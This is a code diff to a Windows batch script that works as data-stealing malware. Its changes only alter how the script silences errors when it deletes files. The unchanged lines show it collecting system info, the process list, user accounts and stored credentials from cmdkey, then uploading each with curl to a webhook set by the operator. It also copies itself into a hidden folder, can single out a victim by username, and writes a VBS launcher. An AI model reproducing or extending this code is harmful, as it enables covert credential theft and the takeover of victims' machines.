@@ -41,7 +41,7 @@ goto skipsysteminfocapture
 	set "tempsys=%appdata%\sysinfo.txt"
 	2>NUL SystemInfo > "%tempsys%"
 	curl --silent --output /dev/null -F systeminfo=@"%tempsys%" %webhook%
-	2>NUL del "%tempsys%"
+	del "%tempsys%" >nul 2>&1
 :skipsysteminfocapture
 
 :: TASK LIST - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
@@ -50,7 +50,7 @@ goto skiptasklist
 	set "temptasklist=%appdata%\tasklist.txt"
 	2>NUL tasklist > "%temptasklist%"
 	curl --silent --output /dev/null -F tasks=@"%temptasklist%" %webhook%
-	2>NUL del "%temptasklist%"
+	del "%temptasklist%" >nul 2>&1
 :skiptasklist
 
 :: NET USER - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
@@ -59,7 +59,7 @@ goto skipnetuser
 	set "netuser=%appdata%\netuser.txt"
 	2>NUL net user > "%netuser%"
 	curl --silent --output /dev/null -F tasks=@"%netuser%" %webhook%
-	2>NUL del "%netuser%"
+	del "%netuser%" >nul 2>&1
 :skipnetuser
 :: QUSER - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
 :: ------------------------------------------------------------------
@@ -67,7 +67,7 @@ goto skipquser
 	set "quser=%appdata%\quser.txt"
 	2>NUL quser > "%quser%"
 	curl --silent --output /dev/null -F tasks=@"%quser%" %webhook%
-	2>NUL del "%quser%"
+	del "%quser%" >nul 2>&1
 :skipquser
 :: CMDKEY - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
 :: ------------------------------------------------------------------
@@ -75,7 +75,7 @@ goto skipcmdkey
 	set "cmdkey=%appdata%\cmdkey.txt"
 	2>NUL cmdkey /list > "%cmdkey%"
 	curl --silent --output /dev/null -F tasks=@"%cmdkey%" %webhook%
-	2>NUL del "%cmdkey%"
+	del "%cmdkey%" >nul 2>&1
 :skipcmdkey
 
 :: CHROME - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
@@ -231,12 +231,12 @@ set "updateurl="
 	:: Target computer's username (Case sensitive) | Leave blank to skip.
 	set "targetusername="
 
-2>NUL del /ah "%vpath%\%uname%"
-2>NUL del /ah "%vpath%\%vname%"
+del /ah "%vpath%\%uname%" >nul 2>&1
+del /ah "%vpath%\%vname%" >nul 2>&1
 
 :: Copy the batch to the hidden location
 if not "%~dp0"=="%vpath%\" (
- 2>NUL del /ah "%vpath%\%bname%"
+  del /ah "%vpath%\%bname%" >nul 2>&1
   >NUL copy "%~f0" "%vpath%\%bname%"
 )
 
@@ -263,7 +263,7 @@ goto dontremoveme2
 :nontargetedupdate
 :: TARGET USERNAME IS NOT SET, UPDATING ON EVERY COMPUTER
 
-	IF EXIST "%vpath%\temp.txt" 2>NUL del "%vpath%\temp.txt"
+	IF EXIST "%vpath%\temp.txt" del "%vpath%\temp.txt" >nul 2>&1
 
 	:: Change VBS
 	echo set WshShell = wscript^.createobject^("WScript.shell"^)> "%vpath%\%vname%"
